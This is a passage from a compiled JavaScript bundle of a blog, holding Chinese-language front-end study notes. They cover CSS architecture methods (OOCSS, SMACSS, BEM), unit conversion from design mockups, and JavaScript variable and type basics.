id=\"重用性\">重用性</h3>\n<ol>\n<li>自訂 class 可在多處使用（OOCSS）</li>\n<li>無重複套用多餘 CSS</li>\n</ol>\n<h3 id=\"維護性\">維護性</h3>\n<ol>\n<li>整體結構是否清晰易懂（Sass import）</li>\n<li>整體風格一致性</li>\n</ol>\n<h3 id=\"移动开发之设计稿转换页面单位尺寸\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://blog.csdn.net/ww0908/article/details/72730267\">移动开发之设计稿转换页面单位尺寸</a></h3>\n<ol>\n<li>設計稿的單位是 <code>px</code>，一般是 750px。</li>\n<li><code>px</code>、<code>rem</code> 混用，<code>rem</code> 的 html <code>font-size</code> 用 16px。</li>\n<li>750px 的設計圖以 375 px 量長寬，\n例如設計圖裡有一元素寬度是 100px，\n那麼可得到寬度是 <code>(100px / 2) / 16px</code> = 3.125rem。</li>\n<li>根據裝置寬度不同，設定不同的 html 的 <code>font-size</code>。</li>\n</ol>\n<h2 id=\"11-css-命名與設計模式\">11. CSS 命名與設計模式</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/croco_works/items/3f0f7407db5f263d2562\">1 段上の CSS 設計・コーディングの概念図 ( HCDC モデル図 )</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/croco_works/items/9a0698097fba2312b9ad\">HCDC による分析と考察／CSS 設計のモデル図が出来るまで</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.slideshare.net/kurotanshi/css-oocss-smacss-bem\">漫談 CSS 架構方法 - 以 OOCSS, SMACSS, BEM 為例</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://speakerdeck.com/kurotanshi/css-bu-shi-wo-men-xiang-xiang-de-zhe-mo-jian-dan-tai-bei-chang\">CSS 不是我們想像的這麼簡單！</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/manabuyasuda/items/dbb76ed36970bec95470\">CSS のクラス名を決めるときに使うリストをつくりました</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/Koki_jp/items/f3d3e824f98d182d4100\">Naming -名前付け- - Qiita</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/taka555/items/6c39f3fe7fca834aa448\">CSS のクラス名を書く前に最低限知っておくべきルール＆BEM を改良してみた - Qiita</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/nezurika/items/a964e21d3596b0ee4c9a\">各 CSS 設計手法を取り入れる上でのメリット・デメリットをまとめてみた</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/ababup1192/items/9a305c95cdf4d93fd32a\">CSS 設計完全ガイドで学んだ PRE_CSS を Elm で堅牢に実装する</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/croco_works/items/e34d1b0c0e50b37031d7\">脱・ Atomic Design - HTML+CSS コーディングの粒度分類法 ( HTML Parts )</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/SYM_simu/items/9d653155fd98e12a641c\">1 年前に素人が FLOCSS 使って直面した疑問/失敗に対し、PRECSS を学んで解消 / 前進できた話 - Qiita</a></li>\n</ul>\n<h3 id=\"oocss（模組化-css，object-oriented-css）\">OOCSS（模組化 CSS，Object Oriented CSS）</h3>\n<h4 id=\"兩大原則\">兩大原則</h4>\n<ul>\n<li>結構與外觀分離 Separate Structure and Skin</li>\n<li>容器與內容分離 Separate Container and Content</li>\n</ul>\n<pre class=\"language-css\"><code class=\"language-css\"><span class=\"token selector\">#button</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 200px<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">height</span><span class=\"token punctuation\">:</span> 50px<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">padding</span><span class=\"token punctuation\">:</span> 10px<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">border</span><span class=\"token punctuation\">:</span> solid 1px #ccc<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">box-shadow</span><span class=\"token punctuation\">:</span> rgba <span class=\"token punctuation\">(</span>0<span class=\"token punctuation\">,</span> 0<span class=\"token punctuation\">,</span> 0<span class=\"token punctuation\">,</span> 0.5<span class=\"token punctuation\">)</span> 2px 2px 5px<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token selector\">#box</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 400px<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">overflow</span><span class=\"token punctuation\">:</span> hidden<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">border</span><span class=\"token punctuation\">:</span> solid 1px #ccc<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">background</span><span class=\"token punctuation\">:</span> linear-gradient <span class=\"token punctuation\">(</span>#ccc<span class=\"token punctuation\">,</span> #222<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token property\">box-shadow</span><span class=\"token punctuation\">:</span> rgba <span class=\"token punctuation\">(</span>0<span class=\"token punctuation\">,</span> 0<span class=\"token punctuation\">,</span> 0<span class=\"token punctuation\">,</span> 0.5<span class=\"token punctuation\">)</span> 2px 2px 5px<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token selector\">#widget</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 500px<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">min-height</span><span class=\"token punctuation\">:</span> 200px<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">overflow</span><span class=\"token punctuation\">:</span> auto<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">border</span><span class=\"token punctuation\">:</span> solid 1px #ccc<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">background</span><span class=\"token punctuation\">:</span> linear-gradient <span class=\"token punctuation\">(</span>#ccc<span class=\"token punctuation\">,</span> #222<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token property\">box-shadow</span><span class=\"token punctuation\">:</span> rgba <span class=\"token punctuation\">(</span>0<span class=\"token punctuation\">,</span> 0<span class=\"token punctuation\">,</span> 0<span class=\"token punctuation\">,</span> 0.5<span class=\"token punctuation\">)</span> 2px 2px 5px<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token selector\">.button</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 200px<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">height</span><span class=\"token punctuation\">:</span> 50px<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token selector\">.box</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 400px<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">overflow</span><span class=\"token punctuation\">:</span> hidden<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token selector\">.widget</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 500px<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">min-height</span><span class=\"token punctuation\">:</span> 200px<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">overflow</span><span class=\"token punctuation\">:</span> auto<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token selector\">.skin</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token property\">border</span><span class=\"token punctuation\">:</span> solid 1px #ccc<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">background</span><span class=\"token punctuation\">:</span> linear-gradient <span class=\"token punctuation\">(</span>#ccc<span class=\"token punctuation\">,</span> #222<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token property\">box-shadow</span><span class=\"token punctuation\">:</span> rgba <span class=\"token punctuation\">(</span>0<span class=\"token punctuation\">,</span> 0<span class=\"token punctuation\">,</span> 0<span class=\"token punctuation\">,</span> 0.5<span class=\"token punctuation\">)</span> 2px 2px 5px<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre><h3 id=\"smacss（scalable--modular-architecture-for-css）\"><a target=\"_blank\" rel=\"nofollow\" href=\"http://smacss.com/\">SMACSS</a>（Scalable &amp; Modular Architecture for CSS）</h3>\n<ul>\n<li>Categorization 將結構分類</li>\n<li>Naming rules 命名規則</li>\n<li>Decoupling CSS from HTML CSS 與 HTML 分離</li>\n</ul>\n<h4 id=\"1-base\">1. Base</h4>\n<ul>\n<li>CSS Reset</li>\n<li>CSS Normalize</li>\n<li>在 Base 類別裡不應使用 !important</li>\n</ul>\n<pre class=\"language-css\"><code class=\"language-css\"><span class=\"token comment\">/* Base */</span>\n\n<span class=\"token selector\">html</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token property\">background-color</span><span class=\"token punctuation\">:</span> #fff<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token selector\">body,\nform</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token property\">padding</span><span class=\"token punctuation\">:</span> 0<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">margin</span><span class=\"token punctuation\">:</span> 0<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token selector\">a</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token property\">text-decoration</span><span class=\"token punctuation\">:</span> none<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token selector\">h1,\nh2,\nh3</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token property\">margin</span><span class=\"token punctuation\">:</span> 1em 0<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre><h4 id=\"2-layout\">2. Layout</h4>\n<ul>\n<li>Header</li>\n<li>Sidebar</li>\n<li>Content</li>\n</ul>\n<pre class=\"language-css\"><code class=\"language-css\"><span class=\"token comment\">/* Layout */</span>\n\n<span class=\"token selector\"># header</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 960px<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">margin</span><span class=\"token punctuation\">:</span> 0 auto<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token selector\">.l-article</span> <span class=\"token punctuation\">{</span>\n  ...<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token selector\">.l-grid</span> <span class=\"token punctuation\">{</span>\n  ...<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token selector\">.l-grid > li</span> <span class=\"token punctuation\">{</span>\n  ...<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre><h4 id=\"3-module\">3. Module</h4>\n<ul>\n<li>頁面上可單獨存在並且可重複使用的元件</li>\n<li>定義 Module 時應避免使用 id 或標記名稱做選擇器</li>\n<li>子模組以原模組名稱加 dash（<code>-</code>）作為名稱。如: <code>.mod-header</code>, <code>.mod-body</code></li>\n</ul>\n<p>例如：</p>\n<ul>\n<li>Tabs</li>\n<li>Customized List</li>\n<li>Button</li>\n</ul>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>fld<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>span</span><span class=\"token punctuation\">></span></span>Folder name<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>span</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><pre class=\"language-css\"><code class=\"language-css\"><span class=\"token comment\">/* The Folder Module */</span>\n<span class=\"token selector\">.fld > span</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token property\">padding-left</span><span class=\"token punctuation\">:</span> 20px<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">background</span><span class=\"token punctuation\">:</span> url <span class=\"token punctuation\">(</span>icon.png<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre><pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>fld<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>span</span><span class=\"token punctuation\">></span></span>Folder Name<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>span</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>span</span><span class=\"token punctuation\">></span></span> ( 32 items ) <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>span</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>fld<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>span</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>fld-name<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Folder Name<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>span</span><span class=\"token punctuation\">></span></span>\n    &lt;span class=\"fld-items> ( 32 items ) <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>span</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><h4 id=\"4-state\">4. State</h4>\n<ul>\n<li>與 Layout, Module 搭配</li>\n<li>表示 Layout 或 Module 的狀態變化</li>\n<li>由 class 定義</li>\n<li>命名規則是 <code>.is-*</code> 開頭</li>\n</ul>\n<p>例如：</p>\n<ul>\n<li>Disabled State</li>\n<li>Default State</li>\n<li>Active State</li>\n<li>Default State</li>\n</ul>\n<pre class=\"language-css\"><code class=\"language-css\"><span class=\"token comment\">/* State */</span>\n<span class=\"token selector\">.is-hidden</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token property\">display</span><span class=\"token punctuation\">:</span> none<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token selector\">.is-error</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token property\">font-weight</span><span class=\"token punctuation\">:</span> 700<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">color</span><span class=\"token punctuation\">:</span> #f00<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token selector\">.is-tab-active</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token property\">border-bottom-color</span><span class=\"token punctuation\">:</span> transparent<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre><h4 id=\"5-theme\">5. Theme</h4>\n<ul>\n<li>定義網站主視覺</li>\n<li>類似 Layout，但影響的是網站整體視覺的變化。</li>\n<li>class 名稱通常以 <code>.theme-*</code> 做開頭</li>\n</ul>\n<h3 id=\"bem（block-element-modifier）\">BEM（Block-Element-Modifier）</h3>\n<ul>\n<li>拋棄語意式命名，改以工具功能、性質命名。</li>\n</ul>\n<h4 id=\"命名結構\">命名結構</h4>\n<ul>\n<li>以 Block 起始</li>\n<li>Element 接續（中間使用 2 個底線連結）</li>\n<li>Modifier 做結（中間使用 2 個橫線連結）。</li>\n<li><code>block__element--modifier</code></li>\n</ul>\n<h4 id=\"1-block-1\">1. Block</h4>\n<p>可獨立再利用的內容，即前端框架裡的元件，例如 card 便是個好的 Block 例子。</p>\n<p>避免如 shopping-list 這類具體的名字，\n命名為 check-list 這類一般性的名稱，能夠在各種情況下再利用。\n例如命名為 check-list 後便能同時在 shopping-list 和 TODO List 裡使用。</p>\n<ul>\n<li>在頁面上獨立存在並可重複使用的元件</li>\n<li>如同 SMACSS 的 Module, Layout</li>\n<li>每個 Block 都是獨立存在的</li>\n</ul>\n<pre class=\"language-css\"><code class=\"language-css\">.button .b-button .text-field .b-text-field .heading .b-heading .menu .b-menu<span class=\"token punctuation\">;</span></code></pre><h4 id=\"2-element\">2. Element</h4>\n<p>只存在於 Block 裡的內容，例如 <code>card__title</code> 或 <code>card__text</code>、<code>card__button</code>。</p>\n<p>Element 只允許一層巢狀。也就是說，規範上是不可命名為 <code>card__button__text</code>的。\n但可以將 button 定義為新的 Block，並命名為 <code>button__text</code>。</p>\n<ul>\n<li>為 Block 的一部份（子組件）</li>\n<li>無法獨立於 Block 之外</li>\n<li>有些 Block 可能沒有 Element</li>\n</ul>\n<pre class=\"language-css\"><code class=\"language-css\">.button__icon .text-field__label .heading__title .menu__item<span class=\"token punctuation\">;</span></code></pre><h4 id=\"3-modifier\">3. Modifier</h4>\n<p>用於修飾 Block 或 Element，因此必定存在做為基底的 class。\n以 card 為例：card card--featured. card class 本身有 padding 和 border, card--featured class 只改變背景顏色。</p>\n<ul>\n<li>用來定義 Block 或 Element 的狀態或屬性</li>\n<li>類似 SMACSS 的 State</li>\n<li>同一個 Block 或 Element 可以允許多組 modifier 同時存在</li>\n</ul>\n<pre class=\"language-css\"><code class=\"language-css\">.button_active .text-field_editable .heading_align_top .menu__item_promo<span class=\"token punctuation\">;</span></code></pre><h4 id=\"chainable-bem-modifiers\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/yasuhiro-yamada/items/25b170d2b56005bf413e\">Chainable BEM modifiers</a></h4>\n<p>由 Jordan Lewis 所提出的 BEM 改寫方式，簡略為 <code>-命名空間-值</code>，\n例如：<code>-color-red</code>, <code>-size-large</code>，同一個命名空間不可賦予兩個以上的值。</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token comment\">&lt;!-- Large green button --></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>button</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>btn -color-green -size-large<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>button</span><span class=\"token punctuation\">></span></span></code></pre><pre class=\"language-scss\"><code class=\"language-scss\">.btn {\n  font-size: 20px;\n  background-color: grey;\n\n  &amp;.-color-green {\n    background-color: green;\n  }\n\n  &amp;.-size-large {\n    font-size: 30px;\n    padding: 10px;\n  }\n}</code></pre><p>由伺服器端或 JavaScript 進行狀態修改的 class 則加上 <code>is-</code>。</p>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://chupainotebook.blogspot.com/2019/05/bemcss.html\">BEM, CSS 設計模式</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://frasco.io/5-reasons-to-use-bem-f5ca38f748a1\">BEM を使うべき 5 つの理由 ( なぜ BEM が G.R.E.A.T といえるのか )</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/mame_hashbill/items/bf541f795533b40e3cdc\">[BEM 設計]うわああああ三 ( 卍^o^ ) 卍ってならない BEM の書き方をワイヤーフレーム使って整理するぞ ( その 1 )</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/mame_hashbill/items/81267a7ec498ff113a3b\">[BEM 設計]うわああああ三 ( 卍^o^ ) 卍ってならない BEM の書き方をワイヤーフレーム使って整理するぞ ( その 2 )</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/mame_hashbill/items/972b124a9a476cf8b326\">うわあああああああ三 ( 卍^o^ ) 卍ってなってたどりついた私的な BEM の使い方</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://stackoverflow.com/questions/22723290/naming-bem-sub-blocks\">naming BEM sub blocks [duplicate]</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://getbem.com/naming/\">BEM Naming</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://en.bem.info/methodology/key-concepts/\">BEM Key concepts</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/Takuan_Oishii/items/0f0d2c5dc33a9b2d9cb1\">一番詳しい CSS 設計規則 BEM のマニュアル</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/mame_hashbill/items/c5b09461d7acfce047fa\">[HTML/SCSS] BEM 設計をワイヤーフレームを使って解説してみる</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/hiloki/flocss\">flocss</a></li>\n</ul>\n<h3 id=\"flocss\">FLOCSS</h3>\n<h3 id=\"precss\">PRECSS</h3>\n<h3 id=\"atomic-css-樣式原子化\">Atomic CSS 樣式原子化</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://design.dena.com/design/atomic-design-%E3%82%92%E5%88%86%E3%81%8B%E3%81%A3%E3%81%9F%E3%81%A4%E3%82%82%E3%82%8A%E3%81%AB%E3%81%AA%E3%82%8B/\">Atomic Design を分かったつもりになる | DeNA DESIGN BLOG</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/seya/items/8814e905693f00cdade2\">フロントエンドのコンポーネント設計に立ち向かう - Qiita</a></li>\n</ul>\n<h2 id=\"參考文章-1\">參考文章</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://hackmd.io/@chupai/Byo_VJu84/\">竹白筆記本 - HTML &amp; CSS 整理</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://ithelp.ithome.com.tw/articles/10196272\">前端新手村</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://hackmd.io/vs5zeSweTt-0AHM9iyyY_w?both\">CSS SECRETS 筆記</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://hackmd.io/@chupai/BJASrHh9V/\">Sass 學習筆記</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/AllThingsSmitty/css-protips/tree/master/translations/zh-TW\">CSS 專家密技</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/jawil/blog/issues/29\">CSS 黑魔法小技巧</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://30-seconds.github.io/30-seconds-of-css/\">30 seconds of CSS</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://css-tricks.com/debugging-tips-tricks\">CSS Debugging Tips and Tricks</a></li>\n</ul>\n","date":"2019-07-18T07:09:01.000Z","excerpt":"","printDate":"July 18, 2019","printReadingTime":"23 min read"};

var route_67 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod52
});

var Mod53 = {"title":"前端筆記 (3) Javascript","slug":"f2e-03-javascript","html":"<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://jsprimer.net/#javascript-primer\">JavaScript Primer</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://ja.javascript.info/\">現代の JavaScript チュートリアル</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://hackmd.io/@chupai/rkBjZjh7H/\">JavaScript 竹白記事本</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://ithelp.ithome.com.tw/users/20083608/ironman/1354\">邁向 JavaScript 勇者之路</a></li>\n</ul>\n<h2 id=\"現代-js-的常見基礎技術\">現代 JS 的常見基礎技術</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://nodejs.org/en/\">Node.js</a></li>\n<li>Package Manager\n<br>├ npm\n<br>├ Yarn\n<br>└ Bower</li>\n<li>Task Runner / Module Bundler\n<br>├ gulp\n<br>├ Grunt\n<br>├ webpack\n<br>└ Parcel</li>\n<li>Transpiler / Compiler\n<br>└ Babel</li>\n<li>Alt JS\n<br>├ CoffeeScript\n<br>├ TypeScript\n<br>└ PureScript</li>\n<li>Framework / UI Library\n<br>├ React\n<br>├ Vue.js\n<br>├ Angular\n<br>└ Riot.js</li>\n</ul>\n<h2 id=\"撰寫\">撰寫</h2>\n<h3 id=\"變數\">變數</h3>\n<ul>\n<li>case senstive</li>\n<li>首字符可為任意 unicode 或 <code>$</code>、<code>_</code></li>\n<li>第二字符之後除任意 unicode 或 <code>$</code>、<code>_</code> 之外，還可為 <code>0-9</code></li>\n<li>保留字不可用為變數名稱</li>\n</ul>\n<h3 id=\"宣告\">宣告</h3>\n<ul>\n<li><code>var</code> 函式作用域</li>\n<li><code>let</code> 區塊作用域，不可重複宣告</li>\n<li><code>const</code> 區塊作用域，不可重複宣告、不可再次賦值</li>\n</ul>\n<h4 id=\"變數提升-hosting\">變數提升 (Hosting)</h4>\n<p>JavaScript 引擎在解析原始碼時，會先將所有已宣告的變數提升到程式碼的頂部，綁定其所屬作用域但不賦值。</p>\n<pre class=\"language-javascript\"><code class=\"language-javascript\">console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 顯示 undefined</span>\n<span class=\"token keyword\">var</span> a <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></code></pre><p>因此上述例子的 <code>a</code> 並未宣告與賦值，但在執行上不會報錯。</p>\n<h3 id=\"命名\">命名</h3>\n<ul>\n<li>易於理解的內容名稱</li>\n<li>不過長或過短</li>\n<li>不使用容易混淆的名稱</li>\n<li>開頭使用 <code>_</code> 表示具有特殊意義，非必要不使用</li>\n<li>統一命名風格</li>\n<li>只使用英文命名</li>\n<li>習慣用法如下：\n<br>├ 變數／函式名稱：camelCase\n<br>├ 類別名稱：PascalCase\n<br>└ 常數：全大寫，字詞間用下底線 <code>_</code></li>\n</ul>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">let</span> numberOfStudents\n<span class=\"token keyword\">const</span> numberOfLegs\n<span class=\"token keyword\">function</span> <span class=\"token function\">setBackgroundColor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Student</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span></code></pre><h2 id=\"型別\">型別</h2>\n<p>程式語言裡常見的型別有動態型別與靜態型別，靜態型別語言的變數於編譯時已經確定其型別， JavaScript 所屬的動態型別則是於執行階段變數賦值後才會擁有型別。</p>\n<p>Javascript 內建有七大型別：</p>\n<ul>\n<li>Null 空值</li>\n<li>Undefined 「未定義」或「不存在」</li>\n<li>Boolean 布林值 (<code>true</code>、<code>false</code>)</li>\n<li>Number 數值 (整數 <code>1</code> 或浮點數 <code>3.14</code>)</li>\n<li>String 字串 (<code>Hello World</code>)</li>\n<li>Object 物件 (值集合)</li>\n<li>Symbol 於 ES6 新增的新型別</li>\n</ul>\n<p>又可細分為：</p>\n<ol>\n<li>基本型別 (primitive type) / 原始型別</li>\n</ol>\n<ul>\n<li>Boolean</li>\n<li>Number</li>\n<li>String</li>\n<li>特殊值 (<code>undefined</code>、<code>null</code>)</li>\n</ul>\n<ol start=\"2\">\n<li>複合型別 (complex type) / 參考型別 (reference type)</li>\n</ol>\n<ul>\n<li>Object 物件，可再分為三個子型别 (subtype)</li>\n<li>Object 狹義物件</li>\n<li>Array 陣列</li>\n<li>Function 函式</li>\n</ul>\n<h3 id=\"typeof-運算子\"><code>typeof</code> 運算子</h3>\n<p><code>typeof</code> 是能檢視一個值型別的運算子。</p>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">var</span> a<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">typeof</span> a<span class=\"token punctuation\">;</span> <span class=\"token comment\">// \"undefined\"</span>\n\na <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">typeof</span> a<span class=\"token punctuation\">;</span> <span class=\"token comment\">// \"object\"</span>\n\na <span class=\"token operator\">=</span> <span class=\"token keyword\">undefined</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">typeof</span> a<span class=\"token punctuation\">;</span> <span class=\"token comment\">// \"undefined\"</span>\n\na <span class=\"token operator\">=</span> <span class=\"token string\">\"string\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">typeof</span> a<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 